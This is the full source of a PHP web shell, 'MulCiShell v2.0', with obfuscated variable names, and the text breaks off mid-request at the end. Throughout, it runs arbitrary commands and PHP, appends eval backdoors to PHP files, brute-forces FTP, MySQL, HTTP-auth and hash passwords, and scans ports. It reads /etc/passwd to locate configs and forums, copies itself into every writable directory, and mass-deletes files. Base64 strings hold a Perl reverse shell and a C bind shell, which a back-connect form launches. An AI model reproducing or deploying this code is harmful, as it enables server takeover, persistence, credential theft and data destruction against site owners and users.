<?php
@ini_set('memory_limit', '256M'); @set_magic_quotes_runtime(0); session_start(); ob_start(); $sp433e3e = microtime(); if (isset($_GET['theme'])) { $_SESSION['theme'] = $_GET['theme']; } $sp26998c = 'DQojaW5jbHVkZSA8YXNtL2lvY3Rscy5oPg0KI2luY2x1ZGUgPHN5cy90aW1lLmg+DQojaW5jbHVkZSA8c3lzL3NlbGVjdC5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KI2luY2x1ZGUgPGVycm5vLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8bmV0ZGIuaD4NCiNpbmNsdWRlIDxzeXMvdHlwZXMuaD4NCiNpbmNsdWRlIDxuZXRpbmV0L2luLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPHN0ZGludC5oPg0KI2luY2x1ZGUgPHB0aHJlYWQuaD4NCg0Kdm9pZCAqQ2xpZW50SGFuZGxlcih2b2lkICpjbGllbnQpDQp7DQoJaW50IGZkID0gKGludCljbGllbnQ7DQoJZHVwMihmZCwgMCk7DQoJZHVwMihmZCwgMSk7DQoJZHVwMihmZCwgMik7DQoJaWYoZm9yaygpID09IDApDQoJCWV4ZWNsKCIvYmluL2Jhc2giLCAicmVzbW9uIiwgMCk7DQoJY2xvc2UoZmQpOw0KCXJldHVybiAwOw0KfQ0KDQppbnQgbWFpbihpbnQgYXJnYywgY2hhciAqYXJndltdKQ0Kew0KCWludCBtc29jaywgY3NvY2ssIGkgPSAxOw0KCXB0aHJlYWRfdCB0aHJlYWQ7DQoJc3RydWN0IHNvY2thZGRyIHNhZGRyOw0KCXN0cnVjdCBzb2NrYWRkcl9pbiBzYWRkckluOw0KICAgIGludCBwb3J0PWF0b2koYXJndlsxXSk7DQoJaWYoKG1zb2NrID0gc29ja2V0KEFGX0lORVQsIFNPQ0tfU1RSRUFNLCBJUFBST1RPX1RDUCkpID09IC0xKQ0KCQlyZXR1cm4gLTE7DQoNCglzYWRkckluLnNpbl9mYW1pbHkJCT0gQUZfSU5FVDsNCglzYWRkckluLnNpbl9hZGRyLnNfYWRkcgk9IElOQUREUl9BTlk7DQoJc2FkZHJJbi5zaW5fcG9ydAkJPSBodG9ucyhwb3J0KTsNCiAgIA0KCW1lbWNweSgmc2FkZHIsICZzYWRkckluLCBzaXplb2Yoc3RydWN0IHNvY2thZGRyX2luKSk7DQoJc2V0c29ja29wdChtc29jaywgU09MX1NPQ0tFVCwgU09fUkVVU0VBRERSLCAoY2hhciAqKSZpLCBzaXplb2YoaSkpOw0KIA0KCWlmKGJpbmQobXNvY2ssICZzYWRkciwgc2l6ZW9mKHNhZGRyKSkgIT0gMCl7DQoJCWNsb3NlKG1zb2NrKTsNCgkJcmV0dXJuIC0xOw0KCX0NCiANCglpZihsaXN0ZW4obXNvY2ssIDEwKSA9PSAtMSl7DQoJCWNsb3NlKG1zb2NrKTsNCgkJcmV0dXJuIC0xOw0KCX0NCiANCgl3aGlsZSgxKXsNCgkJaWYoKGNzb2NrID0gYWNjZXB0KG1zb2NrLCBOVUxMLCBOVUxMKSkgIT0gLTEpew0KCQkJcHRocmVhZF9jcmVhdGUoJnRocmVhZCwgMCwgaGFuZGxlciwgKHZvaWQgKiljc29jayk7DQoJCX0NCgl9DQoJDQoJcmV0dXJuIDE7DQp9'; $sp4839d7 = 'IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KbXkgKCRpYWRkciwkcG9ydCwkY21kKT1AQVJHVjsNCm15ICRwYWRkcj1zb2NrYWRkcl9pbigkcG9ydCwgaW5ldF9hdG9uKCRpYWRkcikpOw0KbXkgJHByb3RvID0gZ2V0cHJvdG9ieW5hbWUoInRjcCIpOw0Kc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sICRwcm90byk7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKTsNCm9wZW4oU1RET1VULCI+JlNPQ0tFVCIpOw0Kb3BlbihTVERJTiwiPiZTT0NLRVQiKTsNCnByaW50IFNPQ0tFVCAiU2hlbGwgdGVzdFxuIjsNCnByaW50IGV4ZWMoJGNtZCk7DQpjbG9zZShTVERJTik7DQpjbG9zZShTVERPVVQpOw0K'; $sp23ffe3 = 'DQoJIyEvdXNyL2Jpbi9wZXJsDQp1c2Ugd2FybmluZ3M7DQp1c2Ugc3RyaWN0Ow0KdXNlIGRpYWdub3N0aWNzOw0KdXNlIElPOjpTb2NrZXQ6OklORVQ7DQpzdWIgdXNhZ2UNCnsNCglkaWUoIiQwIGhvc3Qgc3RhcnRwb3J0IGVuZHBvcnQKIik7DQp9DQp1c2FnZSB1bmxlc3MoQEFSR1Y+MSk7DQpteSgkaG9zdCwkcywkZSk9QEFSR1Y7DQpmb3JlYWNoKCRzLi4kZSkNCnsNCglteSAkc29jaz1JTzo6U29ja2V0OjpJTkVULT5uZXcNCgkoDQoJCVBlZXJBZGRyPT4kaG9zdCwNCgkJUGVlclBvcnQ9PiRfLA0KCQlQcm90bz0+J3RjcCcsDQoJCVRpbWVvdXQ9PjINCgkpOw0KCXByaW50ICJQb3J0ICBvcGVuCiIgaWYgKCRcc29jayk7DQp9DQoNCgk='; $sp39c596 = 0; $sp8a65f0 = 'KingDefacer'; $sp3f6088 = '123'; $spbcfd1c = 'KingDefacer'; $sp6094e7 = array('127.0.0.1'); $sp43fa06 = 'KingDefacer@msn.com'; $spa5bde5 = basename($_SERVER['PHP_SELF']); $sp879ff7 = $_SERVER['REMOTE_ADDR']; $spfee436 = @gethostbyname($_SERVER['HTTP_HOST']); $sp3a19bc = $_SERVER['SERVER_SOFTWARE']; $sp347c9a = @ini_get('safe_mode') == '' ? 'OFF' : 'ON'; $sp25010a = @ini_get('open_basedir') == '' ? 'OFF' : 'ON'; $sp6f9beb = @php_uname(); $spd57b8f = TrueSize(disk_free_space(realpath(getcwd()))); $sp8a3200 = TrueSize(disk_total_space(realpath(getcwd()))); $sp5904ca = @execmd('id', $sp978cd2); $sp3e6f10 = array('mybb', 'phpbb', 'phpbb3', 'forum', 'forums', 'board', 'boards', 'bb', 'discuss'); $sp3a461f = array('includes', 'include', 'inc'); $spbf7cfc; echo '<script type="text/javascript" language="javascript">
function togglecheck() 
{
    var cb=document.forms[0].check
    for (i in cb) 
    {
        cb[i].checked=(cb[i].checked)?false:true;
    }
}
</script>'; switch ($sp39c596) { case 3: $spd290e7 = false; foreach ($sp6094e7 as $sp879ff7) { if ($sp879ff7 == $_SERVER['REMOTE_ADDR']) { $spd290e7 = true; break; } if (!$spd290e7) { die; } } case 2: if (!isset($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_USER'] != $sp8a65f0 || $_SERVER['PHP_AUTH_PW'] != $sp3f6088) { header('WWW-Authenticate: Basic Realm="Restricted area"'); header('HTTP/1.1 401 Unauthorized'); echo 'Wrong username/password'; die; } case 1: if ($_SERVER['HTTP_USER_AGENT'] != $spbcfd1c) { die; } } if ($sp5904ca) { $sp676578 = strpos($sp5904ca, '(', 0) + 1; $sp72c7d5 = strpos($sp5904ca, ')', $sp676578); $spbdd27c = substr($sp5904ca, $sp676578, $sp72c7d5 - $sp676578); } $sp978cd2 = @ini_get('disable_functions'); if (empty($sp978cd2)) { $sp978cd2 = 'None'; } function rm_rep($spa25e24, &$sp29c1b6, &$sp80229e) { @($sp232d7c = opendir($spa25e24)); if (is_resource($sp232d7c)) { while (@($spcc252e = readdir($sp232d7c))) { if ($spcc252e == '.' || $spcc252e == '..') { continue; } if (is_dir($spa25e24 . '/' . $spcc252e)) { echo "Deleting dir {$spa25e24}/{$spcc252e}...</br>"; rm_rep($spa25e24 . '/' . $spcc252e, $sp29c1b6, $sp80229e); continue; } if (@unlink($spa25e24 . '/' . $spcc252e)) { $sp29c1b6++; echo "Deleted {$spcc252e}...</br>"; } else { $sp80229e++; echo "Failed to delete {$spcc252e}</br>"; } } @closedir($sp232d7c); } else { echo "Failed to open dir {$spa25e24}</br>"; } } function chmod_rep($spa25e24, &$sp29c1b6, &$sp80229e, $sp5c0252) { @($sp232d7c = opendir($spa25e24)); if (is_resource($sp232d7c)) { while (@($sp8b1750 = readdir($sp232d7c))) { if ($sp8b1750 == '.' || $sp8b1750 == '..') { continue; } if (is_dir($spa25e24 . '/' . $sp8b1750)) { echo "Changing file modes in dir {$spa25e24}/{$sp8b1750}...</br>"; chmod_rep($spa25e24 . '/' . $sp8b1750, $sp29c1b6, $sp80229e, $sp5c0252); continue; } if (@chmod($spa25e24 . '/' . $sp8b1750, $sp5c0252)) { $sp29c1b6++; echo "Changed mode for {$sp8b1750}...</br>"; } else { $sp80229e++; echo "Failed to chmod {$spcc252e}</br>"; } } @closedir($sp232d7c); } else { echo "Failed to open dir {$spa25e24}</br>"; } } function spread_self($sp877a3d, &$sp76d016 = 0, $sp6bf0a4 = 0) { if (!$sp6bf0a4) { $spa25e24 = "/home/{$sp877a3d}/public_html/"; } else { $spa25e24 = $sp6bf0a4; } if (is_dir($spa25e24) && is_writable($spa25e24)) { copy(CleanDir(getcwd()) . '/' . basename($_SERVER['PHP_SELF']), $spa25e24 . $sp224638 . '/mshell.php'); echo "[+] Shell copied to {$spa25e24}.{$sp224638}./mshell.php</br>"; $sp76d016++; } if (@($sp232d7c = opendir($spa25e24))) { echo "[-] Failed to open dir {$spa25e24}</br>"; } while (@($sp224638 = readdir($sp232d7c))) { if ($sp224638 != '.' && $sp224638 != '..') { if (@is_dir($spa25e24 . $sp224638)) { echo "[+] Spreading to dir {$spa25e24}</br>"; if (@is_writable($spa25e24 . $sp224638)) { copy(CleanDir(getcwd()) . '/' . basename($_SERVER['PHP_SELF']), $spa25e24 . $sp224638 . '/mshell.php'); echo "[+] Shell copied to {$spa25e24}.{$sp224638}./mshell.php</br>"; $sp76d016++; } $sp76d016 += spread_self($sp877a3d, $sp76d016, $spa25e24 . $sp224638 . '/'); } } } } function copy_rep($spa25e24, &$sp76d016) { } function backup_site() { if (!isset($_POST['busite'])) { echo '<center>The following tool will attempt to retrieve every file from the specified dir (including child dirs).</br>If successful, you will be prompted for a site backup download.</br><i>Note: Only readable files will be downloaded. Images and executables will be discarded. This tool should only be used in scenarios in which you have to quickly retrieve a site\'s source.</i></center>'; } } function infect_rep($spa25e24, &$sp29c1b6, &$sp80229e) { } function copy_dir($spa25e24, $sp4d947e) { } function execmd($sp7bd36a, $spd0ae81 = 'None') { if ($spd0ae81 == 'None') { $spe6a02a = passthru($sp7bd36a); return $spe6a02a; } $sp6fb727 = array('shell_exec', 'exec', 'passthru', 'system', 'popen', 'proc_open'); $spd0ae81 = str_replace(' ', '', $spd0ae81); $spf21150 = explode(',', $spd0ae81); foreach ($sp6fb727 as $sp063c10) { if (!in_array($sp063c10, $spf21150)) { if ($sp063c10 == 'exec') { $spe6a02a = @exec($sp7bd36a); $spe6a02a = join('
', $spe6a02a); return $spe6a02a; } elseif ($sp063c10 == 'system') { $spe6a02a = @system($sp7bd36a); return $spe6a02a; } elseif ($sp063c10 == 'passthru') { $spe6a02a = @passthru($sp7bd36a); return $spe6a02a; } elseif ($sp063c10 == 'shell_exec') { $spe6a02a = @shell_exec($sp7bd36a); return $spe6a02a; } elseif ($sp063c10 == 'popen') { $spe6a02a = @popen("{$sp7bd36a}", 'r'); if (is_resource($spe6a02a)) { while (@(!feof($spe6a02a))) { $sp437738 .= @fgets($spe6a02a); } @pclose($spe6a02a); return $sp437738; } return -1; } elseif ($sp063c10 = 'proc_open') { $spa06679 = array(0 => array('pipe', 'r'), 1 => array('pipe', 'w')); $sp62f543 = @proc_open($sp7bd36a, $spa06679, $spc3c09c); if (@is_resource($sp62f543)) { while (@(!feof($spc3c09c[1]))) { $spe6a02a .= @fgets($spc3c09c[1]); } @fclose($spc3c09c[1]); @proc_close($sp62f543); return $spe6a02a; } return -1; } } } return -1; } $sp459317 = array('Enumerate' => "{$spa5bde5}?act=enum", 'Files' => "{$spa5bde5}?act=files", 'Domains' => "{$spa5bde5}?act=domains", 'MySQL' => "{$spa5bde5}?act=sql", 'Encoder' => "{$spa5bde5}?act=encode", 'Sec. Info' => "{$spa5bde5}?act=sec", 'Cracker' => "{$spa5bde5}?act=bf", 'Bypassers' => "{$spa5bde5}?act=bypass", 'Tools' => "{$spa5bde5}?act=tools", 'Databases' => "{$spa5bde5}?act=dbs", 'Backdoor Host' => "{$spa5bde5}?act=bh", 'Back Connect' => "{$spa5bde5}?act=backc", 'Spread Shell' => "{$spa5bde5}?act=spread", 'Kill Shell' => "{$spa5bde5}?act=kill"); echo '<html><head><title>MulCiShell v2.0 - Edited By KingDefacer</title></head>'; switch ($_SESSION['theme']) { case 'green': echo '<style>
            body{color:#66FF00; font-size: 12px; font-family: serif; background-color: black;}
            td {border: 1px solid #00FF00; background-color:#001f00; padding: 2px; font-size: 12px; color: #33FF00;}
            td:hover{background-color: black; color: #33FF00;}
            input{background-color: black; color: #00FF00; border: 1px solid green;}
            input:hover{background-color: #006600;}
            textarea{background-color: black; color: #00FF00; border: 1px solid white;}
            a {text-decoration: none; color: #66FF00; font-weight: bold;}
            a:hover {color: #00FF00;}
            select{background-color: black; color: #00FF00;}
            #main{border-bottom: 1px solid #33FF00; padding: 5px; text-align: center;}
            #main a{padding-right: 15px; color:#00CC00; font-size: 12px; font-family: arial; text-decoration: none; }
            #main a:hover{color: #00FF00; text-decoration: underline;}
            #bar{width: 100%; position: fixed; background-color: black; bottom: 0; font-size: 10px; left: 0; border-top: 1px solid #FFFFFF; height: 12px; padding: 5px;}
            </style>
            <body>'; break; case 'dark': echo '<style>
            body{color: #FFFFFF; font-size: 12px; font-family: serif; background-color: #000000;}
            td {border: 1px solid #FFFFFF; background-color: #000000; padding: 2px; font-size: 12px; color: #FFFFFF;}
            input{background-color: black; color: #FFFFFF;; border: 1px solid #FFFFFF;}
            input:hover{background-color: #000099;}
            textarea{background-color: #000000; color: #FFFFFF; border: 1px solid white;}
            a {text-decoration: none; color: #FFFFFF; font-weight: bold;}
            a:hover {font-weight: bold;}
            select{background-color: #000000; color: #FFFFFF;}
            #main{border-bottom: 1px solid white; padding: 5px; text-align: center;}
            #main a{padding-right: 15px; color:#FFFFFF; font-size: 12px; font-family: arial; text-decoration: none; }
            #main a:hover{font-weight: bold;}
            #bar{width: 100%; position: fixed; background-color: black; bottom: 0; font-size: 10px; left: 0; border-top: 1px solid #FFFFFF; height: 12px; padding: 5px;}
            </style><body>'; break; default: echo '<style>
            body{color: white; font-size: 12px; font-family: arial; scrollbar-base-color:blue; scrollbar-arrow-color:yellow; scrollbar-face-color:blue; }
            td {border: 1px solid #000099; background-color: #000033; padding: 2px; font-size: 12px; color: white; }
            input{background-color: black; color: white; border: 1px solid #000066;}
            input:hover{background-color: #000066; border: 1px solid white;}
            td:hover {color: yellow; background: black;}
            textarea{background-color: #000033; color: white; border: 1px solid white;}
            a {text-decoration: none; color: white; font-weight: bold;}
            a:hover {color: yellow}
            select{background-color: black; color: white;}
            #main{border-bottom: 1px solid #0066FF; padding: 5px; text-align: center;}
            #main a{padding-right: 15px; color: white; font-size: 12px; font-family: arial; text-decoration: none; }
            #main a:hover{color: #0033FF; text-decoration: underline;}
            #bar{width: 100%; position: fixed; background-color: black; bottom: 0; font-size: 10px; left: 0; border-top: 1px solid #FFFFFF; height: 12px; padding: 5px;}
            </style>
            <body bgcolor=\'black\'>'; break; } echo base64_decode('PGNlbnRlcjxpbWcgc3JjPSdodHRwOi8vaW1nNTI5LmltYWdlc2hhY2sudXMvaW1nNTI5LzExNjYv
bWlsY2lzaGVsbGxrNi5wbmcnPjwvY2VudGVyPg=='); echo "<table style='width: inherit; margin: auto; text-align: center;'>\n<tr><td>Server IP</td><td>Your IP</td><td>Disk space</td><td>Safe_mode?</td><td>Open_BaseDir?</td><td>System</td><td>Server software</td><td>Disabled functions</td><td>ID</td><td>Shell location</td></tr>\n<tr><td>{$spfee436}</td><td>{$sp879ff7}</td><td>{$spd57b8f} of {$sp8a3200}</td><td>{$sp347c9a}</td><td>{$sp25010a}</td><td>{$sp6f9beb}</td><td>{$sp3a19bc}</td><td>{$sp978cd2}</td><td>{$spbdd27c}</td><td>" . CleanDir(getcwd()) . '/' . basename($_SERVER['PHP_SELF']) . '</td></tr>
</table></br>
<div id=\'main\'>'; foreach ($sp459317 as $sp9c4d84 => $sp879ff7) { echo "<a href='{$sp879ff7}'>[ {$sp9c4d84} ]</a>"; } echo '</div><br>'; if (isset($_POST['encryption'])) { $sp72c7d5 = $_POST['encrypt']; echo "<form action='{$spa5bde5}?' method='post'><center><textarea rows='19' cols='75' readonly>MD5: " . md5($sp72c7d5) . '
SHA1: ' . sha1($sp72c7d5) . '
Crypt: ' . crypt($sp72c7d5) . '
CRC32: ' . crc32($sp72c7d5) . '
Base64 Encoded: ' . base64_encode($sp72c7d5) . '
Base64 decoded: ' . base64_decode($sp72c7d5) . '
URL encode: ' . urlencode($sp72c7d5) . '
URL decode: ' . urldecode($sp72c7d5) . '
Bin2Hex ' . bin2hex($sp72c7d5) . '
Dec2Hex: ' . dechex($sp72c7d5) . '</textarea><br><br>Input: <input type=\'text\' style=\'width: 300px\' name=\'encrypt\'>
    <br><input type=\'submit\' value=\'Encrypt\' name=\'encryption\'></center>'; } if (isset($_POST['dogetfile'])) { execmd("wget {$_POST['wgetfile']}", $sp978cd2); } if (isset($_POST['doUpload'])) { $spa25e24 = $_POST['u_location']; $sp19dd0c = $_FILES['u_file']['name']; switch ($_FILES['u_file']['error']) { case 0: if (@move_uploaded_file($_FILES['u_file']['tmp_name'], $spa25e24 . '/' . $sp19dd0c)) { echo 'File uploaded successfully<br>'; } else { echo 'Failed to upload file!'; } } } if (isset($_POST['massfiles'])) { $sp80229e = 0; $sp29c1b6 = 0; switch ($_POST['fileaction']) { case 'Infect': foreach ($_POST['files'] as $spa3ecf0) { $spe7e244 = strrchr($spa3ecf0, '.'); if ($spe7e244 != '.php') { continue; } @($spa027fe = fopen($spa3ecf0, 'a')); if (@is_resource($spa027fe)) { $sp29c1b6++; @fwrite($spa027fe, '<?php @eval($_GET[\'e\']) ?>'); @fclose($spa027fe); } else { $sp80229e++; } } echo "Successfully infected {$sp29c1b6} files; failed to infect {$sp80229e} files</br>Exploit files as such: file.php?e=php code"; break; case 'Delete': foreach ($_POST['files'] as $spa3ecf0) { if (is_dir($spa3ecf0)) { rm_rep($spa3ecf0, $sp29c1b6, $sp80229e); } else { if (@unlink(CleanDir($spa3ecf0))) { echo "File {$spa3ecf0} deleted<br>"; $sp29c1b6++; } else { echo "Failed to delete file {$spa3ecf0}<br>"; $sp80229e++; } } } echo "Total files deleted: {$sp29c1b6}; failed to delete {$sp80229e} files<br>"; break; case 'Chmod': foreach ($_POST['files'] as $spa3ecf0) { if (is_dir($spa3ecf0)) { chmod_rep($spa3ecf0, $sp29c1b6, $sp80229e, $_POST['cmodv']); } if (@chmod(CleanDir($spa3ecf0), $_POST['cmodv'])) { echo "Changed mode for {$spa3ecf0}<br>"; $sp29c1b6++; } else { echo "Failed to change mode for {$spa3ecf0}<br>"; $sp80229e++; } } echo "Total files modes modified: {$sp29c1b6}; failed to chmod {$sp80229e} files<br>"; break; } } if (isset($_POST['docrack'])) { $sp581666 = true; $spb4da9a = 0; $sp6a3fdf = @fopen($_FILES['wordlist']['tmp_name'], 'r'); if (is_resource($sp6a3fdf)) { if (isset($_POST['ftpcrack'])) { echo "Bruting {$_POST['ftp_user']}@{$_POST['ftp_host']}...</br>"; if (!empty($_POST['ftp_port'])) { $sp2d79fe = $_POST['ftp_port']; } else { $sp2d79fe = '3306'; } if (empty($_POST['ftp_timeout']) || !preg_match('/^[0-9]$/', $_POST['ftp_timeout'])) { $spdec3d1 = 3; } else { $spdec3d1 = $_POST['ftp_timeout']; } @($spa8152e = ftp_connect($_POST['ftp_host'], $sp2d79fe, $spdec3d1)); if (!$spa8152e) { $sp581666 = false; } if ($sp581666) { $spb4da9a++; while (!feof($sp6a3fdf)) { @($sp83677c = fgets($sp6a3fdf)); if (ftp_login($spa8152e, $_POST['ftp_user'], trim($sp83677c))) { echo "Password found! Password for {$_POST['ftp_user']} is {$sp83677c}<br>"; @ftp_close($spa8152e); break; } if ($spb4da9a == 10000) { echo "Trying pass {$sp83677c}...</br>"; $spb4da9a = 0; } } } else { echo 'Failed to connect!</br>'; } } elseif (isset($_POST['remote_login'])) { if (preg_match('/^http:\\/\\/+/', $_POST['remote_login_target'])) { die('Do not include http:// in the target URL.'); } $sp49de29 = explode('/', $_POST['remote_login_target']); $spdc14f1 = $sp49de29[0]; for ($sp6c3e91 = 1; $sp6c3e91 < count($sp49de29); $sp6c3e91++) { $sp19600a .= '/' . $sp49de29[$sp6c3e91]; } } elseif (isset($_POST['vbcrack'])) { if (empty($_POST['vbhash']) or empty($_POST['vbsalt'])) { die('Please specify a hash and salt'); } while (!feof($sp6a3fdf)) { $spb4da9a++; $sp83677c = trim(fgets($sp6a3fdf)); $sp813a38 = md5(md5($sp83677c) . $_POST['vbsalt']); if ($sp813a38 === $_POST['vbhash']) { echo "Password for {$_POST['vbhash']} found! is {$sp83677c}</br>"; break; } if ($spb4da9a === 10000) { $spb4da9a = 0; echo "Trying pass {$sp83677c}...</br>"; } } echo 'Complete</br>'; } elseif (isset($_POST['mysqlcrack'])) { $spe8f871 = $_POST['mysql_host']; $sp877a3d = $_POST['mysql_user']; if (!empty($_POST['mysql_port'])) { $spe8f871 .= ":{$_POST['mysql_port']}"; } while (!feof($sp6a3fdf)) { $spb4da9a++; $sp83677c = trim(fgets($sp6a3fdf)); if (@mysql_connect($spe8f871, $sp877a3d, $sp83677c)) { echo "Password found! Password for {$sp877a3d} is {$sp83677c}</br>"; break; } if ($spb4da9a == 10000) { echo "Trying {$sp83677c}...</br>"; $spb4da9a = 0; continue; } } } elseif (isset($_POST['authcrack'])) { $sp662a5a = explode('/', $_POST['auth_url']); $sp1af847 = $sp662a5a[0]; if (empty($_POST['auth_url'])) { die('Enter a target first...'); } for ($sp6c3e91 = 1; $sp6c3e91 < count($sp662a5a); $sp6c3e91++) { $sp49de29 .= '/' . $sp662a5a[$sp6c3e91]; } if (preg_match('/^http:\\/\\/+/', $_POST['auth_url'])) { die('Do not include http:// in the url'); } while (!feof($sp6a3fdf)) { if (is_resource($spc02088 = fsockopen($sp1af847, 80, $spfe6fb7, $sp2ea0cc, 5))) { $spb4da9a++; $sp83677c = trim(fgets($sp6a3fdf)); if ($spb4da9a > 5000) { $spb4da9a = 0; echo $sp83677c; } $sp35fbea = base64_encode(trim($_POST['auth_user']) . ':' . $sp83677c); $sp15a4ce = "GET {$sp49de29} HTTP/1.1\r\n"; $sp15a4ce .= "Host: {$sp1af847}\r\n"; $sp15a4ce .= "Authorization: Basic {$sp35fbea}\r\n"; $sp15a4ce .= 'Connection: Close

'; fputs($spc02088, $sp15a4ce, strlen($sp15a4ce)); $sped1c3a++; while (!feof($spc02088)) { $sped1c3a = fgets($spc02088); if (preg_match('/HTTP\\/\\d+\\.\\d+ 200+/', $sped1c3a)) { echo "Password found! Password={$sp83677c}</br></br>"; break 2; } } } } echo 'Done</br>'; } elseif (isset($_POST['md5crack'])) { if (empty($_POST['md5hash'])) { die('Enter a hash before attempting to crack one ;)'); } $sp127c15 = trim($_POST['md5hash']); while (!feof($sp6a3fdf)) { $spb4da9a++; $sp83677c = trim(fgets($sp6a3fdf)); if (md5($sp83677c) === $sp127c15) { echo "Password found! Plaintext for {$sp127c15} is {$sp83677c}</br>"; break; } if ($spb4da9a == 10000) { echo "Trying {$sp83677c}...</br>"; $spb4da9a = 0; continue; } } } elseif (isset($_POST['sha1crack'])) { if (empty($_POST['sha1hash'])) { die('Enter a hash before attempting to crack one ;)'); } $sp3cbfc6 = trim($_POST['sha1hash']); while (!feof($sp6a3fdf)) { $spb4da9a++; $sp83677c = trim(fgets($sp6a3fdf)); if (sha1($sp83677c) === $sp3cbfc6) { echo "Password found! Plaintext for {$sp3cbfc6} is {$sp83677c}</br>"; break; } if ($spb4da9a == 10000) { echo "Trying {$sp83677c}...</br>"; $spb4da9a = 0; continue; } } } } @fclose($sp6a3fdf); } if (isset($_POST['port_scan'])) { switch ($_POST['type']) { case 'php': extract($_POST); while ($sp6c15e8 <= $sp4f3690) { echo "Trying port {$sp6c15e8}"; if (@fsockopen($spe8f871, $sp6c15e8, $spfe6fb7, $sp2ea0cc, 2)) { echo "Port {$sp6c15e8} open</br>"; } $sp6c15e8++; } break; default: echo 'Invalid request</br>'; } } if (isset($_POST['find_forums'])) { echo '<center><b>[ Forum locator ]</b></center></br></br>'; $sp16bd78 = 0; global $sp3e6f10; @($sp694629 = fopen($_POST['passwd'], 'r')) or die('Failed to open passwd file!'); while (!feof($sp694629)) { @(list($sp877a3d, $spa73fbb, $spca6b76, $spba592d, $sp981f5a, $spa49b90) = explode(':', fgets($sp694629))); $sp49de29 = "/home/{$sp877a3d}/public_html"; if (@is_dir($sp49de29)) { foreach ($sp3e6f10 as $sp24a199) { $sp19600a = $sp49de29 . "/{$sp24a199}/"; if (@is_dir($sp19600a)) { echo "[+] Forum found: Path: {$sp19600a}</br>"; $sp16bd78++; continue; } } } } echo "Scan complete. Found {$sp16bd78} forums</br></br>"; } function find_configs($sp49de29, &$sp16bd78) { if (@file_exists($sp49de29 . 'config.php')) { echo "Found config file: {$sp49de29}" . 'config.php</br>'; $sp16bd78++; } @($sp232d7c = opendir($sp49de29)); while (@($spa3ecf0 = readdir($sp232d7c))) { if (is_dir($spa3ecf0) && $spa3ecf0 != '.' && $spa3ecf0 != '..') { find_configs($sp49de29 . $spa3ecf0 . '/', $sp16bd78); } } @closedir($sp232d7c); } if (isset($_POST['find_configs'])) { $sp16bd78 = 0; echo '<center><b>[ Config locator ]</b></center></br></br>'; @($sp694629 = fopen($_POST['passwd'], 'r')) or die('Failed to open passwd file!'); while (!feof($sp694629)) { @(list($sp877a3d, $spa73fbb, $spca6b76, $spba592d, $sp981f5a, $spa49b90) = explode(':', fgets($sp694629))); $sp49de29 = "/home/{$sp877a3d}/public_html/"; find_configs($sp49de29, $sp16bd78); } @fclose($sp694629); echo "Scan complete. Found {$sp16bd78} configs</br></br>"; } if (isset($_POST['execmd'])) { echo '<center><textarea rows=\'10\' cols=\'100\'>'; echo execmd($_POST['cmd'], $sp978cd2); echo '</textarea></center>'; } if (isset($_POST['execphp'])) { echo '<center><textarea rows=\'10\' cols=\'100\'>'; echo eval(stripslashes($_POST['phpcode'])); echo '</textarea></center>'; } if (isset($_POST['cnewfile'])) { if (@fopen($_POST['newfile'], 'w')) { echo 'File created<br>'; } else { echo 'Failed to create file<br>'; } } if (isset($_POST['cnewdir'])) { if (@mkdir($_POST['newdir'])) { echo 'Directory created<br>'; } else { echo 'Failed to create directory<br>'; } } if (isset($_POST['doeditfile'])) { FileEditor(); } switch ($_GET['act']) { case 'backc': if (!isset($_POST['backconnip'])) { echo "<center><form action='{$spa5bde5}?act=backc' method='post'>\n        Address: <input type='text' value='{$_SERVER['REMOTE_ADDR']}' name='backconnip'>\n        Port: <input type='text' value='1337' name='backconnport'>\n        <input type='submit' value='Connect'></br></br>\n        Listen with netcat by executing 'nc -l -n -v -p 1337'</br></br>\n        <b>Note: Be sure to foward your port first</b>\n        </form></center>"; } else { if (empty($_POST['backconnport']) || empty($_POST['backconnip'])) { die('Specify a host/port'); } if (is_writable('.')) { @($spa027fe = fopen(getcwd() . '/bc.pl', 'w')); @fwrite($spa027fe, base64_decode($sp4839d7)); @fclose($spa027fe); echo 'Attempting to connect...</br>'; execmd('perl ' . getcwd() . "/bc.pl {$_POST['backconnip']} {$_POST['backconnport']}", $sp978cd2); if (!@unlink(getcwd() . '/bc.pl')) { echo '<font color=\'#FF0000\'>Warning: Failed to delete reverse-connection program</font></br>'; } } else { @($spa027fe = fopen('/tmp/bc.pl', 'w')); @fwrite($spa027fe, base64_decode($sp4839d7)); @fclose($spa027fe); echo 'Attempting to connect...</br>'; if (!@unlink('/tmp/bc.pl')) { echo '<font color=\'#FF0000\'><h2>Warning: Failed to delete reverse-connection program<</h2>/font></br>'; } } } break; case 'dbs': database_tools(); break; case 'sql': SQLLogin(); break; case 'sqledit': SQLEditor(); break; case 'download': SQLDownload(); break; case 'tools': show_tools(); break; case 'logout': $_SESSION = array(); session_destroy(); echo 'Logged out from MySQL.<br>'; break; case 'f': FileEditor(); break; case 'encode': Encoder(); break; case 'bypass': security_bypass(); break; case 'bf': brute_force(); break; case 'bh': BackDoor(); break; case 'spread': if (!isset($_POST['spread_shell'])) { echo '<center><form action=\'?act=spread\' method=\'post\'>
        This tool will attempt to copy the shell into every writable directory on the server, in order to allow access maintaining.</br>
        Passwd file: <input type=\'text\' value=\'/etc/passwd\' name=\'passwd_file\'></br>
        <input type=\'submit\' value=\'Spread\' name=\'spread_shell\'>
        </form></center>'; } else { $sp676578 = 0; @($spa3ecf0 = fopen($_POST['passwd_file'], 'r')); if (is_resource($spa3ecf0)) { while (!feof($spa3ecf0)) { @(list($sp877a3d, $spa73fbb, $spca6b76, $spba592d, $sp981f5a, $spa49b90) = explode(':', fgets($spa3ecf0))); spread_self($sp877a3d, $sp676578); } @fclose($spa3ecf0); } echo $sp676578 > 0 ? "Spread complete. Successfully managed to spread the shell {$sp676578} times</br>" : 'Failed to spread the shell.</br>'; } break; case 'domains': $sp15a4ce = "GET /search/reverse-ip-domain.php?q={$_SERVER['HTTP_HOST']} HTTP/1.0\r\n"; $sp15a4ce .= 'Host: searchy.protecus.de
'; $sp15a4ce .= 'Connection: Close

